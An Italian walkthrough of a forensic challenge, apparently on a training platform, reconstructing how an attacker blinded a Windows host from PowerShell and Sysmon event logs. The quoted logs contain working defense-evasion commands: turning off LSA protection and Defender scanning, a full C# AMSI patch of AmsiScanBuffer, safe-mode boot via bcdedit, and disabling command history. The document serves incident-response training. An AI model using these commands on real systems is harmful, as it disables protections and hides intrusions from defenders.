---
title: "Operation Blackout 2025: Smoke & Mirrors Walkthrough"
description: "In Smoke & Mirrors, i giocatori analizzano i log di evento e gli artefatti forensi forniti per scoprire come l'attaccante ha disabilitato o alterato le funzionalità di sicurezza. Devono identificare gli strumenti, i comandi o gli script utilizzati per ridurre la visibilità e ricostruire i metodi impiegati dall'attaccante per operare inosservato."
author: dua2z3rr
date: 2025-10-18 1:00:00
categories: Sherlocks
tags: []
---

## Introduzione

### Domande

1. L'attaccante ha disabilitato la protezione LSA sull'host compromesso modificando una chiave di registro. Qual è il percorso completo di quella chiave di registro?
2. Quale comando PowerShell ha eseguito per primo l'attaccante per disabilitare Windows Defender?
3. L'attaccante ha caricato una patch AMSI scritta in PowerShell. Quale funzione nella DLL viene patchata dallo script per disabilitare efficacemente AMSI?
4. Quale comando ha usato l'attaccante per riavviare la macchina in Modalità Provvisoria?
5. Quale comando PowerShell ha usato l'attaccante per disabilitare la registrazione della cronologia dei comandi di PowerShell?

### Overview

Per completare questo sherlock, dovremmo controllare simultaneamente 3 file **.evxt**:
1. Microsoft-Windows-Powershell
2. Microsoft-Windows-Powershell-Operational
3. Microsoft-Windows-Sysmon-Operational

## Risposte

### L'attaccante ha disabilitato la protezione LSA sull'host compromesso modificando una chiave di registro. Qual è il percorso completo di quella chiave di registro?

Sapendo che l'attaccante ha modificato una chiave di registro con la protezione LSA, possiamo  filtrare per comandi come  `reg add`. Otterremo questo come primo risultato:

```xml
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" /> 
  <EventID>4104</EventID> 
  <Version>1</Version> 
  <Level>5</Level> 
  <Task>2</Task> 
  <Opcode>15</Opcode> 
  <Keywords>0x0</Keywords> 
  <TimeCreated SystemTime="2025-04-10T06:29:16.6206307Z" /> 
  <EventRecordID>3365</EventRecordID> 
  <Correlation ActivityID="{d72fe4f3-a9dd-0001-c108-31d7dda9db01}" /> 
  <Execution ProcessID="9808" ThreadID="4644" /> 
  <Channel>Microsoft-Windows-PowerShell/Operational</Channel> 
  <Computer>DESKTOP-M3AKJSD</Computer> 
  <Security UserID="S-1-5-21-3999086100-426973801-4203759309-1002" /> 
  </System>
- <EventData>
  <Data Name="MessageNumber">1</Data> 
  <Data Name="MessageTotal">1</Data> 
  <Data Name="ScriptBlockText">reg add HKLM\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL /t REG_DWORD /d 0 /f</Data> 
  <Data Name="ScriptBlockId">fe2e75fb-6d30-4b45-a3dc-710e3092814a</Data> 
  <Data Name="Path" /> 
  </EventData>
  </Event>
```

Risposta: `HKLM\SYSTEM\CurrentControlSet\Control\LSA`

### Quale comando PowerShell ha eseguito per primo l'attaccante per disabilitare Windows Defender?

Se vogliamo disabilitare **Windows Defender**, lo si fa comunemente con il comando `Set-MpPreference`. Cercando questo comando troviamo questo log:

```xml
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" /> 
  <EventID>4104</EventID> 
  <Version>1</Version> 
  <Level>5</Level> 
  <Task>2</Task> 
  <Opcode>15</Opcode> 
  <Keywords>0x0</Keywords> 
  <TimeCreated SystemTime="2025-04-10T06:31:32.8678260Z" /> 
  <EventRecordID>3466</EventRecordID> 
  <Correlation ActivityID="{d72fe4f3-a9dd-0001-5d27-31d7dda9db01}" /> 
  <Execution ProcessID="9808" ThreadID="4644" /> 
  <Channel>Microsoft-Windows-PowerShell/Operational</Channel> 
  <Computer>DESKTOP-M3AKJSD</Computer> 
  <Security UserID="S-1-5-21-3999086100-426973801-4203759309-1002" /> 
  </System>
- <EventData>
  <Data Name="MessageNumber">1</Data> 
  <Data Name="MessageTotal">1</Data> 
  <Data Name="ScriptBlockText">Set-MpPreference -DisableIOAVProtection $true -DisableEmailScanning $true -DisableBlockAtFirstSeen $true</Data> 
  <Data Name="ScriptBlockId">db55fc25-b6e7-4c04-bf27-37c1c540870a</Data> 
  <Data Name="Path" /> 
  </EventData>
  </Event>
```

Risposta: `Set-MpPreference -DisableIOAVProtection $true -DisableEmailScanning $true -DisableBlockAtFirstSeen $true`

### L'attaccante ha caricato una patch AMSI scritta in PowerShell. Quale funzione nella DLL viene patchata dallo script per disabilitare efficacemente AMSI?

Cercando `.dll` nei file troviamo questo log:

```xml
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="PowerShell" /> 
  <EventID Qualifiers="0">800</EventID> 
  <Version>0</Version> 
  <Level>4</Level> 
  <Task>8</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x80000000000000</Keywords> 
  <TimeCreated SystemTime="2025-04-10T06:37:50.6898884Z" /> 
  <EventRecordID>702</EventRecordID> 
  <Correlation /> 
  <Execution ProcessID="9808" ThreadID="0" /> 
  <Channel>Windows PowerShell</Channel> 
  <Computer>DESKTOP-M3AKJSD</Computer> 
  <Security /> 
  </System>
- <EventData>
  <Data>Add-Type -TypeDefinition $k</Data> 
  <Data>DetailSequence=1 DetailTotal=1 SequenceNumber=213 UserId=DESKTOP-M3AKJSD\User HostName=ConsoleHost HostVersion=5.1.26100.3624 HostId=06070939-645a-4cb4-bb35-feff3e76ad09 HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe EngineVersion=5.1.26100.3624 RunspaceId=62516b95-d457-41c9-aa13-31b963bcf8bb PipelineId=55 ScriptName= CommandLine= Add-Type -TypeDefinition $k</Data> 
  <Data>CommandInvocation(Add-Type): "Add-Type" ParameterBinding(Add-Type): name="TypeDefinition"; value="using System; using System.Runtime.InteropServices; public class P { [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName); [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string lpModuleName); [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect); public static bool Patch() { IntPtr h = GetModuleHandle("a" + "m" + "s" + "i" + ".dll"); if (h == IntPtr.Zero) return false; IntPtr a = GetProcAddress(h, "A" + "m" + "s" + "i" + "S" + "c" + "a" + "n" + "B" + "u" + "f" + "f" + "e" + "r"); if (a == IntPtr.Zero) return false; UInt32 oldProtect; if (!VirtualProtect(a, (UIntPtr)5, 0x40, out oldProtect)) return false; byte[] patch = { 0x31, 0xC0, 0xC3 }; Marshal.Copy(patch, 0, a, patch.Length); return VirtualProtect(a, (UIntPtr)5, oldProtect, out oldProtect); } }"</Data> 
  </EventData>
  </Event>
```

Risposta: `AmsiScanBuffer`

### Quale comando ha usato l'attaccante per riavviare la macchina in Modalità Provvisoria?

Filtrando la parola safe possiamo trovare questo log contenente la risposta:

```xml
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
  <EventID>1</EventID> 
  <Version>5</Version> 
  <Level>4</Level> 
  <Task>1</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8000000000000000</Keywords> 
  <TimeCreated SystemTime="2025-04-10T06:38:35.4404645Z" /> 
  <EventRecordID>7899</EventRecordID> 
  <Correlation /> 
  <Execution ProcessID="4420" ThreadID="5708" /> 
  <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
  <Computer>DESKTOP-M3AKJSD</Computer> 
  <Security UserID="S-1-5-18" /> 
  </System>
- <EventData>
  <Data Name="RuleName">-</Data> 
  <Data Name="UtcTime">2025-04-10 06:38:35.426</Data> 
  <Data Name="ProcessGuid">{53c665d1-676b-67f7-9503-000000001700}</Data> 
  <Data Name="ProcessId">2568</Data> 
  <Data Name="Image">C:\Windows\System32\bcdedit.exe</Data> 
  <Data Name="FileVersion">10.0.26100.3624 (WinBuild.160101.0800)</Data> 
  <Data Name="Description">Boot Configuration Data Editor</Data> 
  <Data Name="Product">Microsoft® Windows® Operating System</Data> 
  <Data Name="Company">Microsoft Corporation</Data> 
  <Data Name="OriginalFileName">bcdedit.exe</Data> 
  <Data Name="CommandLine">"C:\WINDOWS\system32\bcdedit.exe" /set safeboot network</Data> 
  <Data Name="CurrentDirectory">C:\WINDOWS\system32\</Data> 
  <Data Name="User">DESKTOP-M3AKJSD\User</Data> 
  <Data Name="LogonGuid">{53c665d1-5fe9-67f7-d656-120000000000}</Data> 
  <Data Name="LogonId">0x1256d6</Data> 
  <Data Name="TerminalSessionId">1</Data> 
  <Data Name="IntegrityLevel">High</Data> 
  <Data Name="Hashes">MD5=707D25EE218FA644009B0460A2E09449,SHA256=3A42FE964FB421BE598FF05B9974FCABB9432DDD336C9DA03D0F2688D942CAC2,IMPHASH=4A19F9C41191A1ADD7867BE6ACCA390A</Data> 
  <Data Name="ParentProcessGuid">{53c665d1-6535-67f7-5603-000000001700}</Data> 
  <Data Name="ParentProcessId">9808</Data> 
  <Data Name="ParentImage">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data> 
  <Data Name="ParentCommandLine">"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"</Data> 
  <Data Name="ParentUser">DESKTOP-M3AKJSD\User</Data> 
  </EventData>
  </Event>
```

Risposta: `bcdedit.exe /set safeboot network`

### Quale comando PowerShell ha usato l'attaccante per disabilitare la registrazione della cronologia dei comandi di PowerShell?

Cercando online che comando si usa solitamente per disabilitare la cronologia dei comandi su powershell, troviamo `Set-PSReadlineOption -HistorySaveStyle SaveNothing`. Cercandolo sui log troviamo lo stesso comando usato.

```xml
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" /> 
  <EventID>4104</EventID> 
  <Version>1</Version> 
  <Level>5</Level> 
  <Task>2</Task> 
  <Opcode>15</Opcode> 
  <Keywords>0x0</Keywords> 
  <TimeCreated SystemTime="2025-04-10T06:38:43.5490019Z" /> 
  <EventRecordID>3802</EventRecordID> 
  <Correlation ActivityID="{d72fe4f3-a9dd-0003-79d9-30d7dda9db01}" /> 
  <Execution ProcessID="9808" ThreadID="4644" /> 
  <Channel>Microsoft-Windows-PowerShell/Operational</Channel> 
  <Computer>DESKTOP-M3AKJSD</Computer> 
  <Security UserID="S-1-5-21-3999086100-426973801-4203759309-1002" /> 
  </System>
- <EventData>
  <Data Name="MessageNumber">1</Data> 
  <Data Name="MessageTotal">1</Data> 
  <Data Name="ScriptBlockText">Set-PSReadlineOption -HistorySaveStyle SaveNothing</Data> 
  <Data Name="ScriptBlockId">eef9a7e3-fc56-47f7-b44f-2b4e1681d0bc</Data> 
  <Data Name="Path" /> 
  </EventData>
  </Event>
```

Risposta: `Set-PSReadlineOption -HistorySaveStyle SaveNothing`
